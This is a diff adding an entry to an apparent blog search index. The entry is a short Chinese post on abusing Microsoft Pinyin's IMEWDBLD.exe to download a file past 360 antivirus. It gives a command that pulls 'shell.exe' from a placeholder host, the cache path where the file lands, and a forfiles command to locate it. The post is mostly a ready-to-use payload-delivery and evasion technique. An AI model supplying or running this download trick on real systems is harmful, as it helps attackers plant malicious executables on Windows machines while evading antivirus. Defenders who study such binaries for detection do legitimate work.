@@ -6072,4 +6072,30 @@ insert into test1 value(3,15);
         <category>cnblogs</category>
       </categories>
   </entry>
+  <entry>
+    <title>IMEWDBLD.exe ByPass360 下载文件</title>
+    <url>/2021/07/09/IMEWDBLD-exe-ByPass360-%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<p>参考：<a class="link" href="https://mp.weixin.qq.com/s/AvhN1iEqL_LcIU9mNwoFBg">https://mp.weixin.qq.com/s/AvhN1iEqL_LcIU9mNwoFBg<i class="fas fa-external-link-alt"></i></a></p>
+<p>IMEWDBLD.exe是微软拼音的开放扩展字典模块，主要用来下载字典文件，在Windows中主要存在路径为：C:\Windows\System32\IME\SHARED\IMEWDBLD.exe</p>
+<p>下载命令为</p>
+<pre><code>C:\Windows\System32\IME\SHARED\IMEWDBLD.exe http://xxxxx/shell.exe
+</code></pre>
+<p>下载后的存放路径为</p>
+<pre><code>C:\Users\%username%\AppData\Local\Microsoft\Windows\INetCache\IE\[随机值]
+</code></pre>
+<p>下载时会弹出报错，不用管</p>
+<p><img src="image-20210709103503656.png" alt="image-20210709103503656"></p>
+<p>下载后找到文件位置（主要是为了找到这个随机值）<br>    forfiles /P “%localappdata%\Microsoft\Windows\INetCache” /S /M * /C “cmd /c echo @path”</p>
+<pre><code>    参数介绍
+/P 表示开始搜索的路径。默认文件夹是当前工作的 目录 (.)。
+/S 指导 forfiles 递归到子目录。像 &quot;DIR /S&quot;。
+/M 根据搜索掩码搜索文件。默认搜索掩码是 &#39;*&#39;。
+/C 表示为每个文件执行的命令。命令字符串应该用双引号括起来。
+@path 返回文件的完整路径
+</code></pre>
+<p>一般下载后，就会名字后面会多一个[1]</p>
+<p><img src="image-20210709103653910.png" alt="image-20210709103653910"></p>
+<p><img src="image-20210709103558230.png" alt="image-20210709103558230"></p>
+]]></content>
+  </entry>
 </search>
